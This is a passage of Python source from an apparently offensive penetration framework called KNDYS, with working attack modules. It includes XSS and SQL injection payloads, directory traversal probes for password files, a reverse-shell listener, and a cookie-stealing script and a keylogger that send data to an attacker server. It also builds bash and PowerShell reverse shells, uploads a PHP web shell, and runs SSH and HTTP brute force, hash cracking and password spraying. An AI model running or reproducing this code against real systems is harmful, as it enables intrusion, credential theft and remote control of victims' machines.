                continue
        
        return None
    
    def run_xss_scanner(self):
        """Advanced XSS scanner"""
        url = self.module_options['url']
        method = self.module_options.get('method', 'GET').upper()
        
        print(f"{Fore.CYAN}[*] Scanning for XSS vulnerabilities: {url}{Style.RESET_ALL}")
        
        # Test different XSS payloads
        payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Obfuscated payloads
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            "<img src=\"x\" `\"'><script>alert('XSS')</script>",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            
            # JavaScript URI
            "javascript:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            
            # HTML entities
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # Unicode
            "＜script＞alert('XSS')＜/script＞"
        ]
        
        found = []
        
        for payload in payloads:
            try:
                if method == 'GET':
                    test_url = f"{url}{payload}"
                    headers = {'User-Agent': self.config['user_agent']}
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                else:
                    # For POST requests, we need to identify parameters
                    headers = {'User-Agent': self.config['user_agent']}
                    response = requests.post(url, data={'input': payload}, headers=headers, timeout=10, verify=False)
                
                # Check if payload appears in response
                if payload in response.text:
                    found.append(payload)
                    print(f"{Fore.GREEN}[+] XSS found with payload: {payload[:50]}...{Style.RESET_ALL}")
                else:
                    # Check for decoded payload
                    decoded_payload = payload.replace('&lt;', '<').replace('&gt;', '>')
                    if decoded_payload in response.text:
                        found.append(payload)
                        print(f"{Fore.GREEN}[+] XSS found (decoded) with payload: {payload[:50]}...{Style.RESET_ALL}")
                        
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing payload {payload[:20]}: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] XSS scan completed{Style.RESET_ALL}")
        if found:
            print(f"{Fore.GREEN}[+] Found {len(found)} XSS vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No XSS vulnerabilities found{Style.RESET_ALL}")
    
    def run_ssl_scanner(self):
        """SSL/TLS vulnerability scanner"""
        target = self.module_options['target']
        
        print(f"{Fore.CYAN}[*] Scanning SSL/TLS configuration: {target}{Style.RESET_ALL}")
        
        try:
            # Parse host and port
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 443
            
            # Test SSL connection
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate validity
                    print(f"{Fore.YELLOW}[*] Certificate Information:{Style.RESET_ALL}")
                    
                    # Check expiry
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (not_after - datetime.now()).days
                    
                    if days_left < 0:
                        print(f"{Fore.RED}[-] Certificate expired {abs(days_left)} days ago{Style.RESET_ALL}")
                    elif days_left < 30:
                        print(f"{Fore.YELLOW}[!] Certificate expires in {days_left} days{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}[+] Certificate valid for {days_left} more days{Style.RESET_ALL}")
                    
                    # Check weak protocols
                    print(f"{Fore.YELLOW}[*] Testing protocols...{Style.RESET_ALL}")
                    
                    weak_protocols = ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']
                    for protocol in weak_protocols:
                        try:
                            context = ssl.SSLContext(getattr(ssl, f"PROTOCOL_{protocol.upper().replace('V', '_V')}"))
                            with socket.create_connection((host, port), timeout=5) as s:
                                with context.wrap_socket(s, server_hostname=host) as ss:
                                    print(f"{Fore.RED}[-] {protocol} enabled (WEAK){Style.RESET_ALL}")
                        except:
                            print(f"{Fore.GREEN}[+] {protocol} disabled{Style.RESET_ALL}")
                    
                    # Check weak ciphers (simplified)
                    print(f"{Fore.YELLOW}[*] Checking cipher strength...{Style.RESET_ALL}")
                    cipher = ssock.cipher()
                    if cipher:
                        print(f"{Fore.GREEN}[+] Current cipher: {cipher[0]}{Style.RESET_ALL}")
                        
                        # Check for weak ciphers
                        weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT']
                        if any(weak in cipher[0] for weak in weak_ciphers):
                            print(f"{Fore.RED}[-] Weak cipher detected: {cipher[0]}{Style.RESET_ALL}")
                    
        except Exception as e:
            print(f"{Fore.RED}[-] SSL scan error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] SSL scan completed{Style.RESET_ALL}")
    
    def run_dir_traversal(self):
        """Directory traversal scanner"""
        url = self.module_options['url']
        depth = int(self.module_options.get('depth', 3))
        
        print(f"{Fore.CYAN}[*] Scanning for directory traversal: {url}{Style.RESET_ALL}")
        
        # Common traversal payloads
        payloads = []
        for i in range(1, depth + 1):
            dots = '../' * i
            payloads.extend([
                f"{dots}etc/passwd",
                f"{dots}windows/win.ini",
                f"{dots}boot.ini",
                f"{dots}etc/shadow",
                f"{dots}etc/hosts",
                f"{dots}..\\windows\\win.ini",
                f"..%2f{'..%2f' * (i-1)}etc/passwd",
                f"..%c0%af{'..%c0%af' * (i-1)}etc/passwd"
            ])
        
        found = []
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for success indicators
                indicators = [
                    'root:', '[boot loader]', '[fonts]',
                    '[extensions]', 'daemon:', 'bin:', 'sys:'
                ]
                
                for indicator in indicators:
                    if indicator in response.text:
                        found.append(payload)
                        print(f"{Fore.GREEN}[+] Directory traversal found: {payload}{Style.RESET_ALL}")
                        break
                        
            except Exception as e:
                continue
        
        print(f"\n{Fore.CYAN}[*] Directory traversal scan completed{Style.RESET_ALL}")
        if found:
            print(f"{Fore.GREEN}[+] Found {len(found)} directory traversal vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No directory traversal vulnerabilities found{Style.RESET_ALL}")
    
    # ============ EXPLOIT MODULES ============
    
    def run_multi_handler(self):
        """Multi/handler for reverse connections"""
        lhost = self.module_options.get('lhost', self.config['lhost'])
        lport = int(self.module_options.get('lport', 4444))
        
        print(f"{Fore.CYAN}[*] Starting multi/handler on {lhost}:{lport}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Waiting for connections...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}\n")
        
        try:
            # Create listening socket
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((lhost, lport))
            server.listen(5)
            server.settimeout(1)
            
            connections = []
            
            while True:
                try:
                    client, addr = server.accept()
                    print(f"{Fore.GREEN}[+] Connection received from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                    connections.append((client, addr))
                    
                    # Handle connection in separate thread
                    threading.Thread(target=self.handle_reverse_shell, args=(client, addr)).start()
                    
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    break
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        finally:
            print(f"{Fore.YELLOW}[*] Stopping multi/handler{Style.RESET_ALL}")
    
    def handle_reverse_shell(self, client, addr):
        """Handle reverse shell connection"""
        try:
            print(f"{Fore.GREEN}[*] Shell session opened with {addr[0]}{Style.RESET_ALL}")
            
            # Send welcome message
            welcome = b"\nKNDYS Framework - Reverse Shell Session\n"
            client.send(welcome)
            
            # Interactive shell
            while True:
                try:
                    # Show prompt
                    prompt = f"{Fore.CYAN}kndys-shell{Fore.RED}@{addr[0]}{Fore.CYAN}$ {Style.RESET_ALL}"
                    cmd = input(prompt)
                    
                    if cmd.lower() in ['exit', 'quit']:
                        client.send(b'exit\n')
                        break
                    
                    client.send(cmd.encode() + b'\n')
                    
                    # Receive output
                    client.settimeout(0.5)
                    output = b''
                    try:
                        while True:
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                    except socket.timeout:
                        pass
                    
                    if output:
                        print(output.decode('utf-8', errors='ignore'))
                        
                except KeyboardInterrupt:
                    client.send(b'\x03')  # Ctrl+C
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                    break
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Shell error: {str(e)}{Style.RESET_ALL}")
        finally:
            client.close()
            print(f"{Fore.YELLOW}[*] Shell session closed{Style.RESET_ALL}")
    
    def run_sql_injection(self):
        """SQL injection exploitation"""
        url = self.module_options['url']
        technique = self.module_options.get('technique', 'union')
        
        print(f"{Fore.CYAN}[*] Exploiting SQL injection: {url}{Style.RESET_ALL}")
        
        if technique == 'union':
            self.exploit_union_sqli(url)
        elif technique == 'error':
            self.exploit_error_sqli(url)
        else:
            print(f"{Fore.RED}[!] Technique {technique} not implemented{Style.RESET_ALL}")
    
    def exploit_union_sqli(self, url):
        """Exploit UNION-based SQL injection"""
        print(f"{Fore.YELLOW}[*] Attempting UNION-based exploitation{Style.RESET_ALL}")
        
        # First, find number of columns
        print(f"{Fore.BLUE}[*] Finding number of columns...{Style.RESET_ALL}")
        
        for i in range(1, 10):
            payload = f"' ORDER BY {i}--"
            test_url = url.replace('=', f"={payload}")
            
            try:
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for error
                if 'error' in response.text.lower() or 'order by' in response.text.lower():
                    num_columns = i - 1
                    print(f"{Fore.GREEN}[+] Number of columns: {num_columns}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        # Try to extract database version
        print(f"{Fore.BLUE}[*] Extracting database information...{Style.RESET_ALL}")
        
        version_payloads = [
            f"' UNION SELECT @@version,{','.join(['NULL']*(num_columns-1))}--",
            f"' UNION SELECT version(),{','.join(['NULL']*(num_columns-1))}--",
            f"' UNION SELECT sqlite_version(),{','.join(['NULL']*(num_columns-1))}--"
        ]
        
        for payload in version_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Look for version string
                version_pattern = r'\d+\.\d+\.\d+'
                match = re.search(version_pattern, response.text)
                if match:
                    print(f"{Fore.GREEN}[+] Database version: {match.group()}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        # Try to extract table names
        print(f"{Fore.BLUE}[*] Attempting to extract table names...{Style.RESET_ALL}")
        
        table_payloads = [
            f"' UNION SELECT table_name,{','.join(['NULL']*(num_columns-1))} FROM information_schema.tables--",
            f"' UNION SELECT name,{','.join(['NULL']*(num_columns-1))} FROM sqlite_master WHERE type='table'--"
        ]
        
        for payload in table_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Look for common table names
                common_tables = ['users', 'admin', 'customer', 'product', 'order']
                for table in common_tables:
                    if table in response.text.lower():
                        print(f"{Fore.GREEN}[+] Found table: {table}{Style.RESET_ALL}")
            except:
                continue
        
        print(f"\n{Fore.CYAN}[*] SQL injection exploitation completed{Style.RESET_ALL}")
    
    def exploit_error_sqli(self, url):
        """Exploit error-based SQL injection"""
        print(f"{Fore.YELLOW}[*] Attempting error-based exploitation{Style.RESET_ALL}")
        
        # Try to extract database version through errors
        error_payloads = [
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=CONVERT(int, @@version)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, @@version))--"
        ]
        
        for payload in error_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Extract version from error message
                version_pattern = r'\d+\.\d+\.\d+'
                match = re.search(version_pattern, response.text)
                if match:
                    print(f"{Fore.GREEN}[+] Database version (from error): {match.group()}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        print(f"\n{Fore.CYAN}[*] Error-based exploitation completed{Style.RESET_ALL}")
    
    def run_xss_exploit(self):
        """XSS exploitation with cookie stealing"""
        url = self.module_options['url']
        payload_type = self.module_options.get('payload', 'xss_cookie_stealer')
        
        print(f"{Fore.CYAN}[*] Generating XSS exploitation payload{Style.RESET_ALL}")
        
        if payload_type == 'xss_cookie_stealer':
            # Generate cookie stealer payload
            server_url = self.module_options.get('server', f"http://{self.config['lhost']}:8080")
            payload = f"""<script>document.location='{server_url}/steal?cookie='+document.cookie</script>"""
            
            print(f"{Fore.GREEN}[+] XSS Cookie Stealer Payload:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}\n")
            
            print(f"{Fore.YELLOW}[*] To capture cookies, start a web server:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    python3 -m http.server 8080{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Or use the built-in server:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    use post/credential_harvester{Style.RESET_ALL}")
        
        elif payload_type == 'xss_keylogger':
            # Generate keylogger payload
            server_url = self.module_options.get('server', f"http://{self.config['lhost']}:8080")
            payload = f"""
<script>
var keys = '';
document.onkeypress = function(e) {{
    keys += String.fromCharCode(e.keyCode);
    if(keys.length > 100) {{
        new Image().src = '{server_url}/log?keys=' + keys;
        keys = '';
    }}
}};
setInterval(function() {{
    if(keys.length > 0) {{
        new Image().src = '{server_url}/log?keys=' + keys;
        keys = '';
    }}
}}, 5000);
</script>
            """.strip()
            
            print(f"{Fore.GREEN}[+] XSS Keylogger Payload:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}\n")
        
        else:
            print(f"{Fore.RED}[!] Unknown payload type: {payload_type}{Style.RESET_ALL}")
    
    def run_command_injection(self):
        """Command injection exploitation"""
        url = self.module_options['url']
        parameter = self.module_options.get('parameter', 'cmd')
        target_os = self.module_options.get('os', 'linux')
        
        print(f"{Fore.CYAN}[*] Testing command injection on {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Parameter: {parameter}, OS: {target_os}{Style.RESET_ALL}\n")
        
        # Test payloads based on OS
        if target_os == 'linux':
            payloads = [
                f"; whoami",
                f"| id",
                f"`whoami`",
                f"$(whoami)",
                f"|| whoami",
                f"&& whoami",
                f"; ls -la",
                f"; cat /etc/passwd",
                f"; uname -a",
                f"; ifconfig",
                f"; ping -c 1 127.0.0.1"
            ]
        else:  # windows
            payloads = [
                f"& whoami",
                f"| whoami",
                f"&& whoami",
                f"|| whoami",
                f"`whoami`",
                f"^ whoami",
                f"; whoami",
                f"& dir",
                f"& ipconfig",
                f"& ping -n 1 127.0.0.1"
            ]
        
        successful = []
        
        for payload in payloads:
            try:
                # Test the payload
                test_data = {parameter: payload}
                headers = {'User-Agent': self.config['user_agent']}
                
                if '?' in url:
                    # GET request
                    response = requests.get(url, params=test_data, headers=headers, timeout=10, verify=False)
                else:
                    # POST request
                    response = requests.post(url, data=test_data, headers=headers, timeout=10, verify=False)
                
                # Check for command output
                output_indicators = ['uid=', 'gid=', 'root:', 'admin', 'inet', 
                                   'Windows IP', 'Volume in drive', 'Directory of']
                
                for indicator in output_indicators:
                    if indicator in response.text:
                        successful.append(payload)
                        print(f"{Fore.GREEN}[+] Command injection successful: {payload}{Style.RESET_ALL}")
                        print(f"    Output contains: {indicator}")
                        break
                        
            except Exception as e:
                print(f"{Fore.RED}[-] Error with payload {payload}: {str(e)[:50]}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Command injection test completed{Style.RESET_ALL}")
        if successful:
            print(f"{Fore.GREEN}[+] Found {len(successful)} working payloads{Style.RESET_ALL}")
            
            # Generate reverse shell payload
            print(f"\n{Fore.YELLOW}[*] Reverse shell payloads:{Style.RESET_ALL}")
            if target_os == 'linux':
                rev_shell = f"bash -c 'bash -i >& /dev/tcp/{self.config['lhost']}/4444 0>&1'"
                print(f"{Fore.CYAN}    {rev_shell}{Style.RESET_ALL}")
            else:
                rev_shell = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.config['lhost']}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
                print(f"{Fore.CYAN}    {rev_shell[:100]}...{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No command injection vulnerabilities found{Style.RESET_ALL}")
    
    def run_file_upload(self):
        """File upload vulnerability exploitation"""
        url = self.module_options['url']
        parameter = self.module_options.get('parameter', 'file')
        shell_type = self.module_options.get('shell', 'php')
        
        print(f"{Fore.CYAN}[*] Testing file upload vulnerability: {url}{Style.RESET_ALL}")
        
        # Generate malicious file based on shell type
        if shell_type == 'php':
            filename = 'shell.php'
            content = '<?php system($_GET["cmd"]); ?>'
        elif shell_type == 'asp':
            filename = 'shell.asp'
            content = '<% Response.Write("ASP Shell") %>'
        else:
            filename = 'shell.txt'
            content = 'Test file upload'
        
        # Test file upload
        try:
            files = {parameter: (filename, content, 'text/plain')}
            headers = {'User-Agent': self.config['user_agent']}
            
            response = requests.post(url, files=files, headers=headers, timeout=10, verify=False)
            
            if response.status_code in [200, 201, 202]:
                print(f"{Fore.GREEN}[+] File upload successful (Status: {response.status_code}){Style.RESET_ALL}")
                
                # Try to find uploaded file location
                upload_patterns = [
                    r'upload.*success',
                    r'file.*uploaded',
                    r'location.*\/([^"\']+)',
                    r'href.*\/([^"\']+)'
                ]
                
                for pattern in upload_patterns:
                    matches = re.search(pattern, response.text, re.IGNORECASE)
                    if matches:
                        print(f"{Fore.YELLOW}[*] Possible file location pattern found{Style.RESET_ALL}")
                        break
                
                # Test common upload directories
                common_dirs = [
                    'uploads/', 'upload/', 'files/', 'images/',
                    'assets/', 'tmp/', 'temp/', 'public/', 'media/'
                ]
                
                base_url = url.rsplit('/', 1)[0] if '/' in url else url
                
                for directory in common_dirs:
                    test_url = f"{base_url}/{directory}{filename}"
                    try:
                        test_resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
                        if test_resp.status_code == 200:
                            print(f"{Fore.GREEN}[+] File accessible at: {test_url}{Style.RESET_ALL}")
                            
                            # Test command execution
                            if shell_type == 'php':
                                cmd_url = f"{test_url}?cmd=whoami"
                                cmd_resp = requests.get(cmd_url, headers=headers, timeout=5, verify=False)
                                if 'uid=' in cmd_resp.text or 'www-data' in cmd_resp.text:
                                    print(f"{Fore.GREEN}[+] Command execution confirmed!{Style.RESET_ALL}")
                                    print(f"{Fore.CYAN}    Access shell: {test_url}?cmd=id{Style.RESET_ALL}")
                            break
                    except:
                        continue
                        
        except Exception as e:
            print(f"{Fore.RED}[-] Upload error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] File upload test completed{Style.RESET_ALL}")
    
    def run_buffer_overflow(self):
        """Buffer overflow testing framework"""
        target = self.module_options['target']
        
        print(f"{Fore.CYAN}[*] Buffer overflow testing: {target}{Style.RESET_ALL}\n")
        
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 9999  # Default vulnserver port
        
        # Test patterns
        patterns = [
            'A' * 100,
            'A' * 500,
            'A' * 1000,
            'A' * 2000,
            'A' * 5000
        ]
        
        for pattern in patterns:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                # Send pattern
                sock.send(f"TRUN /.:/{pattern}\r\n".encode())
                
                # Receive response
                try:
                    response = sock.recv(1024)
                    print(f"{Fore.BLUE}[*] Sent {len(pattern)} bytes - Response: {response.decode('utf-8', errors='ignore')[:50]}{Style.RESET_ALL}")
                except:
                    print(f"{Fore.GREEN}[+] Possible crash with {len(pattern)} bytes (no response){Style.RESET_ALL}")
                
                sock.close()
                time.sleep(1)
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error with {len(pattern)} bytes: {str(e)}{Style.RESET_ALL}")
                break
        
        print(f"\n{Fore.CYAN}[*] Buffer overflow test completed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] For advanced exploitation, use pattern_create and pattern_offset tools{Style.RESET_ALL}")
    
    # ============ PASSWORD ATTACK MODULES ============
    
    def run_brute_force(self):
        """Password brute force attacks with rate limiting"""
        target = self.module_options['target']
        username = self.module_options.get('username', 'admin')
        wordlist_file = self.module_options.get('wordlist', 'passwords.txt')
        service = self.module_options.get('service', 'ssh')
        delay = float(self.module_options.get('delay', 0.5))  # Delay between attempts
        
        print(f"{Fore.CYAN}[*] Starting brute force attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Service: {service}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}ℹ  Rate limit: {delay}s delay between attempts{Style.RESET_ALL}\n")
        
        # Load wordlist
        passwords = self.wordlists['passwords']
        resolved_wordlist = self.resolve_wordlist_path(wordlist_file, 'password')

        if resolved_wordlist:
            try:
                with open(resolved_wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load wordlist, using built-in{Style.RESET_ALL}")
        elif wordlist_file and not self.find_wordlist_entry(wordlist_file, 'password'):
            print(f"{Fore.YELLOW}[!] Wordlist not found: {wordlist_file}. Using built-in list.{Style.RESET_ALL}")
        
        found = False
        
        if service == 'ssh' and SSH_AVAILABLE:
            # SSH brute force
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 22
            
            print(f"{Fore.BLUE}[*] Testing SSH credentials...{Style.RESET_ALL}")
            
            for i, password in enumerate(passwords[:50], 1):  # Limit to 50 for demo
                # Rate limiting
                self.rate_limiter.wait_if_needed()
                
                print(f"{Fore.BLUE}[{i}/50] Trying: {username}:{password[:3]}***{Style.RESET_ALL}")
                
                try:
                    # Apply connection pool
                    self.connection_pool.acquire()
                    
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=port, username=username, password=password, timeout=5)
                    
                    print(f"\n{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                    found = True
                    
                    # Execute test command
                    stdin, stdout, stderr = ssh.exec_command('whoami')
                    output = stdout.read().decode().strip()
                    print(f"{Fore.YELLOW}[*] Command output: {output}{Style.RESET_ALL}")
                    
                    # Save credential
                    self.logger.save_credential(username, password, f"SSH:{host}:{port}")
                    
                    ssh.close()
                    break
                    
                except paramiko.AuthenticationException:
                    time.sleep(delay)  # Delay after failed attempt
                    continue
                except Exception as e:
                    self.error_handler.handle_error(e, f"SSH connection to {host}:{port}")
                    time.sleep(delay)
                    continue
                finally:
                    self.connection_pool.release()
        
        elif service == 'http':
            # HTTP form brute force
            print(f"{Fore.BLUE}[*] Testing HTTP login form...{Style.RESET_ALL}")
            
            for i, password in enumerate(passwords[:50], 1):  # Limit to 50 for demo
                # Rate limiting
                self.rate_limiter.wait_if_needed()
                
                print(f"{Fore.BLUE}[{i}/50] Trying: {username}:{password[:3]}***{Style.RESET_ALL}")
                
                try:
                    self.connection_pool.acquire()
                    # This is a generic example - you'll need to customize for the target
                    login_data = {
                        'username': username,
                        'password': password,
                        'submit': 'Login'
                    }
                    
                    headers = {'User-Agent': self.config['user_agent']}
                    response = requests.post(target, data=login_data, headers=headers, timeout=10, verify=False)
                    
                    # Check for success indicators
                    success_indicators = ['welcome', 'dashboard', 'logout', 'success']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        print(f"\n{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                        self.logger.save_credential(username, password, f"HTTP:{target}")
                        found = True
                        break
                    
                    time.sleep(delay)  # Delay after attempt
                        
                except Exception as e:
                    self.error_handler.handle_error(e, "HTTP brute force")
                    time.sleep(delay)
                finally:
                    self.connection_pool.release()
        
        else:
            print(f"{Fore.RED}[!] Service {service} not supported{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Brute force attack completed{Style.RESET_ALL}")
        if not found:
            print(f"{Fore.YELLOW}[*] No valid password found{Style.RESET_ALL}")
    
    def run_hash_cracker(self):
        """Advanced hash cracking"""
        target_hash = self.module_options['hash']
        hash_type = self.module_options.get('type', 'md5').lower()
        wordlist_file = self.module_options.get('wordlist', '')
        
        print(f"{Fore.CYAN}[*] Attempting to crack hash{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Hash: {target_hash}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Type: {hash_type}{Style.RESET_ALL}\n")
        
        # Load wordlist
        passwords = self.wordlists['passwords']
        resolved_wordlist = self.resolve_wordlist_path(wordlist_file, 'password')

        if resolved_wordlist:
            try:
                with open(resolved_wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load wordlist, using built-in{Style.RESET_ALL}")
        elif wordlist_file and not self.find_wordlist_entry(wordlist_file, 'password'):
            print(f"{Fore.YELLOW}[!] Wordlist not found: {wordlist_file}. Using built-in list.{Style.RESET_ALL}")
        
        # Hash functions
        hash_functions = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512,
            'ntlm': lambda x: hashlib.new('md4', x.encode('utf-16le')).hexdigest()
        }
        
        if hash_type not in hash_functions:
            print(f"{Fore.RED}[!] Unsupported hash type: {hash_type}{Style.RESET_ALL}")
            return
        
        hash_func = hash_functions[hash_type]
        
        # Try to crack
        print(f"{Fore.CYAN}⟳ Testing {Fore.WHITE}{len(passwords):,}{Fore.CYAN} passwords...{Style.RESET_ALL}\n")
        
        tested = 0
        for password in passwords:
            try:
                if hash_type == 'ntlm':
                    hashed = hash_func(password)
                else:
                    hashed = hash_func(password.encode()).hexdigest()
                
                tested += 1
                if tested % 1000 == 0:
                    print(f"\r{Fore.BLUE}⟳ Tested: {tested:,} hashes...{Style.RESET_ALL}", end='')
                
                if hashed == target_hash.lower():
                    print(f"\n\n{Fore.GREEN}{'═'*50}")
                    print(f"✓ HASH CRACKED!")
                    print(f"{'═'*50}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}→ Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n")
                    self.logger.log(f"Hash cracked: {target_hash} -> {password}", "SUCCESS")
                    return
                    
            except Exception as e:
                continue
        
        print(f"\n\n{Fore.YELLOW}⊘ Hash not found in wordlist ({tested:,} attempts){Style.RESET_ALL}")
        
        # Try brute force for simple patterns
        print(f"{Fore.BLUE}[*] Trying simple brute force...{Style.RESET_ALL}")
        
        # Common patterns
        patterns = [
            # Numeric patterns
            *[str(i) for i in range(100000)][:1000],
            # Date patterns
            *[f"{d:02d}{m:02d}{y}" for y in range(1990, 2025) for m in range(1, 13) for d in range(1, 32)][:1000],
            # Common words with numbers
            *[f"password{i}" for i in range(100)],
            *[f"admin{i}" for i in range(100)],
        ]
        
        for pattern in patterns[:2000]:  # Limit attempts
            try:
                if hash_type == 'ntlm':
                    hashed = hash_func(pattern)
                else:
                    hashed = hash_func(pattern.encode()).hexdigest()
                
                if hashed == target_hash.lower():
                    print(f"\n{Fore.GREEN}[+] HASH CRACKED WITH BRUTE FORCE!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {pattern}{Style.RESET_ALL}")
                    return
            except:
                continue
        
        print(f"\n{Fore.YELLOW}[*] Could not crack hash{Style.RESET_ALL}")
    
    def run_spray_attack(self):
        """Password spray attack"""
        target = self.module_options['target']
        usernames_file = self.module_options.get('usernames', 'users.txt')
        passwords_file = self.module_options.get('passwords', 'passwords.txt')
        delay = int(self.module_options.get('delay', 10))
        
        print(f"{Fore.CYAN}[*] Starting password spray attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Delay between attempts: {delay}s{Style.RESET_ALL}\n")
        
        # Load usernames
        usernames = self.wordlists['usernames']
        resolved_usernames = self.resolve_wordlist_path(usernames_file, 'username')

        if resolved_usernames:
            try:
                with open(resolved_usernames, 'r', encoding='utf-8', errors='ignore') as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load username list, using built-in{Style.RESET_ALL}")
        elif usernames_file and not os.path.exists(usernames_file) and not self.find_wordlist_entry(usernames_file, 'username'):
            print(f"{Fore.YELLOW}[!] Username list not found: {usernames_file}. Using built-in list.{Style.RESET_ALL}")
        
        # Load passwords
        passwords = self.wordlists['passwords']
        resolved_passwords = self.resolve_wordlist_path(passwords_file, 'password')

        if resolved_passwords:
            try:
                with open(resolved_passwords, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load passwords file, using built-in{Style.RESET_ALL}")
